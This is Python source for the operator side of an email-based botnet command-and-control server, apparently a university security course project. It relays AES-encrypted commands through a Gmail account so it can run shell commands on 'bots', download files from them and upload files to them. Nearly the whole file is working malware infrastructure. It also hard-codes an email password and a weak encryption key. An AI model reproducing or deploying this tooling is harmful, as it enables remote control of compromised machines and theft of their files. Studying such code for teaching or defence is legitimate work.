import email
import imaplib
import sys
import uuid
import string
import os
import json
import random
import smtplib
import base64
import cmd

from cmd import Cmd
from datetime import datetime
from base64 import b64decode
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2

gmail_email = 'cse363c2project@gmail.com'
gmail_password = 'cse363c2'
s = "smtp.gmail.com"
s_port = 587
AESKey = 'cse363'
salt = b'363'

def genJobID(slen=7):
	return ''.join(random.sample(string.ascii_letters + string.digits, slen))

class Cipher:

	def __init__(self):
		self.key = PBKDF2(AESKey, salt, dkLen=32)

	def Encrypt(self, plainText):
		aes = AES.new(self.key, AES.MODE_CBC)
		ciphered_data = aes.iv + aes.encrypt(pad(plainText.encode(),AES.block_size))
		return base64.b64encode(ciphered_data)

	def Decrypt(self, cipherText):
		data = base64.b64decode(cipherText[2:-1].encode())
		iv = data[:AES.block_size]
		ciphered_data = data[AES.block_size:]
		aes = AES.new(self.key,AES.MODE_CBC,iv)
		return unpad(aes.decrypt(ciphered_data),AES.block_size)

ciph = Cipher()

class EmailParser:

	def __init__(self, email_data):
		self.attachment = None
		self.getPayloads(email_data)
		self.getSubjectHeader(email_data)
		self.getDateHeader(email_data)

	def getPayloads(self, email_data):
		for payload in email.message_from_string(email_data[1][0][1].decode()).get_payload():
			if payload.get_content_maintype() == 'text':
				self.text = payload.get_payload()
				self.dict = json.loads(ciph.Decrypt(payload.get_payload()))

			elif payload.get_content_maintype() == 'application':
				self.attachment = payload.get_payload()

	def getSubjectHeader(self, email_data):
		self.subject = email.message_from_string(email_data[1][0][1].decode())['Subject']

	def getDateHeader(self, email_data):
		self.date = email.message_from_string(email_data[1][0][1].decode())['Date']


class Server:

	def __init__(self):
		self.c = imaplib.IMAP4_SSL(s)
		self.c.login(gmail_email, gmail_password)
	
	def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):
		if (botid is None) or (jobid is None):
			sys.exit("Client ID and job ID must be specified.")

		#identify the email is from the server and which bot it is for
		header = 'server:{}:{}'.format(botid,jobid)

		#create the email to be sent
		msg = MIMEMultipart()
		msg['From'] = header
		msg['To'] = gmail_email
		msg['Subject'] = header
		msgbody = json.dumps({'cmd': cmd, 'arg': arg})
		msg.attach(MIMEText(str(ciph.Encrypt(msgbody))))

		for file in attachment:
			if os.path.exists(file) == True:
				part = MIMEBase('application', 'octet-stream')
				part.set_payload(open(file, 'rb').read())
				encoders.encode_base64(part)
				part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(file)))
				msg.attach(part)


		mailServer = smtplib.SMTP(host=s, port=s_port)
		mailServer.starttls()
		mailServer.login(gmail_email,gmail_password)
		mailServer.sendmail(gmail_email, gmail_email, msg.as_string())
		mailServer.quit()

		print("Successfully sent with jobid: {}".format(jobid))

	def listBots(self, botidsearch='', printbots=True):
		bots = []
		self.c.select(readonly=1)
		typ, data = self.c.search(None, "(SUBJECT 'checkin:')")

		for idn in reversed(data[0].split()):
			msg_data = self.c.fetch(idn, '(RFC822)')
			msg = EmailParser(msg_data)

			try:
				botid = str(uuid.UUID(msg.subject.split(':')[1]))
				if botid not in bots:
					bots.append(botid)
					if printbots is True:
						print(botid, "|", msg.dict['sysinfo'], "| Last check in:", msg.dict['output'], "({})".format(msg.dict['timezone']))

			except Exception as e:
				pass

		if printbots is False:
			if botidsearch in bots:
				return True
			else:
				return False

	def getJobResult(self, botid, jobid):

		if (botid is None) or (jobid is None):
			sys.exit("Client ID and job ID must be specified.")

		self.c.select(readonly=1)
		typ, data = self.c.search(None, "(SUBJECT 'client:{}:{}')".format(botid, jobid))

		for idn in data[0].split():
			msg_data = self.c.fetch(idn, '(RFC822)')
			msg = EmailParser(msg_data)

			print("JOBID: " + jobid)
			print("COMMAND: '{}'\n\n".format(msg.dict['output']['cmd']))
			print(msg.dict['output']['response'] + '\n')

			if msg.attachment:

				if msg.dict['output']['cmd'] == 'dlfc':
					filename = "bot-{}-job-{}".format(botid, jobid)
					with open("./clientdata/" + filename, 'wb') as dfile:
						dfile.write(b64decode(msg.attachment))
						dfile.close()

					print("File saved to ./clientdata/" + filename)

	def logout():
		self.c.logout()

class MyShell(Cmd):

	def do_list(self, args):
		"""Lists available clients"""
		server = Server()
		server.listBots()

	def do_cmd(self, args):
		"""Execute a shell command on the target client"""
		arg = args.split(" ",1)
		server = Server()
		if len(arg)!=2:
			print("Usage: cmd botid 'command'")
			return
		else:
			botid = arg[0]
			cmd = arg[1]
			cmd = cmd[1:-1]
			if server.listBots(botid, printbots=False):
				jobid = genJobID()
				server.sendEmail(botid, jobid, 'cmd', cmd)
			else:
				print("Bot ID not found")
				return

	def do_dlfc(self, args):
		"""Download a file from the target client"""
		arg = args.split(" ",1)
		server = Server()
		if len(arg)!=2:
			print("Usage: dlfc botid path")
			return
		else:
			botid = arg[0]
			path = arg[1]
			if server.listBots(botid, printbots=False):
				jobid = genJobID()
				server.sendEmail(botid, jobid, 'dlfc', r'{}'.format(path))
			else:
				print("Bot ID not found")
				return

	def do_uptc(self, args):
		"""Upload a file to the target client"""
		arg = args.split(" ",2)
		server = Server()
		if len(arg)!=3:
			print("Usage: uptc botid file_path dest_path")
			return
		else:
			botid = arg[0]
			file_path = arg[1]
			dest_path = arg[2]
			if server.listBots(botid, printbots=False):
				jobid = genJobID()
				server.sendEmail(botid, jobid, 'uptc', r'{}'.format(dest_path), [file_path])
			else:
				print("Bot ID not found")
				return

	def do_resp(self, args):
		"""Get the response from a client's job"""
		arg = args.split(" ",1)
		server = Server()
		if len(arg)!=2:
			print("Usage: resp botid jobid")
			return
		else:
			botid = arg[0]
			jobid = arg[1]
			if server.listBots(botid, printbots=False):
				server.getJobResult(botid, jobid)
			else:
				print("Bot ID not found")
				return

def main():
	helpstring = "Welcome to the CSE363 C&C project!\n" \
				"Commands:\n" \
				"	list 				Retrieve a list of bots in the network\n" \
				"	resp 				Print the response of a bot's job (Usage: dlfc botid jobid)\n" \
				"	cmd 				Execute a system command on client machine (Usage: cmd botid 'command')\n" \
				"	dlfc 				Download a file from the client machine (Usage: dlfc botid path)\n" \
				"	uptc 				Upload a file to the client machine (Usage: uptc botid file_path dest_path)\n" \

	shell = MyShell()
	shell.prompt = '> '
	shell.cmdloop(helpstring)


if __name__ == '__main__':
	main()





